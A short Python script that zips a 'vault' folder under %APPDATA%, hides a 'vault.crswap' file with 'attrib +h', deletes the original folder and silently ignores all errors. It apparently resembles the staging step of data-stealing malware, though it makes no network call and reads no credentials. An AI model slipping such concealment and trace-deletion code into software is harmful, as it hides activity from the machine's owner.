import zipfile
import os
import shutil
import time
import subprocess

def zip():
    vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
    zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')

    if os.path.exists(vault_folder):
        try:
            time.sleep(1)
            with zipfile.ZipFile(zip_file_path, mode='w', compression=zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(vault_folder):
                    for file in files:
                        full_file_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_file_path, vault_folder)
                        zipf.write(full_file_path, arcname)

            crswap_file = os.path.join(os.getenv('APPDATA'), 'vault.crswap')
            if os.path.exists(crswap_file):
                subprocess.run(['attrib', '+h', crswap_file])

            shutil.rmtree(vault_folder)
        except Exception:
            pass
zip()        
